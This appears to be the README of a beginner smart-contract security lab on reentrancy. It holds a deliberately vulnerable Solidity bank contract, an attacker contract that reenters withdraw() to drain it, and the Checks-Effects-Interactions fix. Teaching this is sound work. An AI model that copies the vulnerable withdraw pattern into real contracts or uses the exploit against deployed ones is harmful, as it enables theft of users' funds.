# Lab 00: Reentrancy Vulnerability

**Difficulty**: Beginner  
**Time**: 20-30 minutes  
**Prerequisites**: Foundry installed, basic Solidity knowledge  
**Learning Outcomes**: Understand reentrancy attacks, recognize vulnerable patterns, write exploit POCs

---

## ⚠️ SECURITY WARNING

**These contracts are INTENTIONALLY VULNERABLE for educational purposes only.**

- **DO NOT** deploy to mainnet or testnet with real funds
- **DO NOT** use this code in production
- These contracts demonstrate real vulnerabilities to help you recognize and prevent them

---

## 📚 What You'll Learn

### Reentrancy Attack
A **reentrancy** vulnerability allows an attacker to call back into a contract while it's still processing, causing funds to be withdrawn multiple times before state is updated.

**The Attack Pattern:**
1. Attacker deposits 10 ETH into VulnerableBank
2. Attacker calls withdraw(10 ETH)
3. VulnerableBank sends ETH via call{} (external call)
4. Attacker's receive() hook is triggered
5. While in receive(), attacker calls withdraw() AGAIN
6. VulnerableBank checks balance: still 10 ETH (state not updated yet!)
7. Attacker withdraws another 10 ETH
8. Repeat steps 5-7 multiple times
9. Bank is drained

**Why This Happens:**
VulnerableBank follows this flawed pattern:
```solidity
// 1. Send ETH (external call)
(bool success, ) = msg.sender.call{value: amount}("");

// 2. Update state (TOO LATE!)
balances[msg.sender] -= amount;
```

The problem: **state is updated AFTER the external call, not before.**

---

## 🚀 Quick Start (5 minutes)

### Step 1: Install Foundry
```bash
curl -L https://foundry.paradigm.xyz | bash
source ~/.bashrc  # or ~/.zshrc
foundryup
```

### Step 2: Run the Tests
```bash
cd /path/to/lab-00-reentrancy
forge test -vv
```

### Expected: All tests pass, showing the vulnerability succeeds

---

## 🔍 Lab Walkthrough

### File Structure
```
lab-00-reentrancy/
├── VulnerableBank.sol           # The vulnerable contract
├── Attacker.sol                 # The exploit contract
├── ReentrancyExploit.t.sol      # Foundry test suite
├── foundry.toml                 # Foundry config
└── README.md                    # This file
```

### The Vulnerable Code

In `VulnerableBank.sol`:
```solidity
function withdraw(uint256 amount) public {
    require(balances[msg.sender] >= amount, "Insufficient balance");

    // VULNERABLE: External call before state update
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Withdrawal failed");

    // State update happens too late!
    balances[msg.sender] -= amount;
}
```

**The Problem:**
1. Sends ETH before updating balance
2. Attacker's receive() hook can call back
3. Balance check uses stale state

### The Attack

In `Attacker.sol`:
```solidity
function attack(uint256 initialAmount) public payable {
    // 1. Deposit into the bank
    bank.deposit{value: initialAmount}();

    // 2. Start withdrawal (triggers the reentrancy)
    bank.withdraw(initialAmount);
}

receive() external payable {
    // 3. Called when bank sends ETH
    // 4. Call withdraw() again while state is inconsistent
    if (bank.getUserBalance(address(this)) >= amountToWithdraw) {
        bank.withdraw(amountToWithdraw);  // Reenters!
    }
}
```

---

## 📝 Lab Exercises

### Exercise 1: Run the Tests
```bash
forge test -vv --match-path "*ReentrancyExploit*"
```

**Questions:**
- How many times does the attacker reenter?
- How much ETH does the attacker steal total?

### Exercise 2: Analyze the Vulnerability
1. Open `VulnerableBank.sol`
2. Find the root cause
3. Identify the exact line that enables the attack
4. Explain the execution order

### Exercise 3: Trace the Attack
Draw out the call stack showing:
- When balance is checked
- When ETH is sent
- When the attacker reenters
- When state is updated

---

## 🛡️ The Fix

**Checks-Effects-Interactions Pattern:**

Update state BEFORE making external calls:

```solidity
function withdraw(uint256 amount) public {
    require(amount > 0, "Withdrawal amount must be greater than 0");
    require(balances[msg.sender] >= amount, "Insufficient balance");

    // FIX 1: Update state FIRST
    balances[msg.sender] -= amount;

    // FIX 2: Then make external call
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Withdrawal failed");
}
```

**Why this works:**
- If attacker calls withdraw() again in receive(), balance check fails
- Reentrant call reverts before any ETH is sent
- State is protected

---

## 🧪 Running Tests

```bash
# All tests
forge test -vv

# Just reentrancy tests
forge test --match "Reentrancy"

# With gas reporting
forge test --gas-report
```

---

## 📚 Further Reading

- Reentrancy Attacks: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy
- Checks-Effects-Interactions: https://solidity.readthedocs.io/en/latest/security-considerations.html#re-entrancy
- The DAO Attack (2016): https://blog.openzeppelin.com/reentrancy-after-istanbul/
- SWC-107: https://swcregistry.io/docs/SWC-107

---

## 🎓 Next Week: The Fix

In Lab 01, we'll implement:
1. Checks-Effects-Interactions pattern
2. Reentrancy guard (OpenZeppelin)
3. Test both defenses

---

**Ready? Run `forge test -vv` and observe the vulnerability in action!**
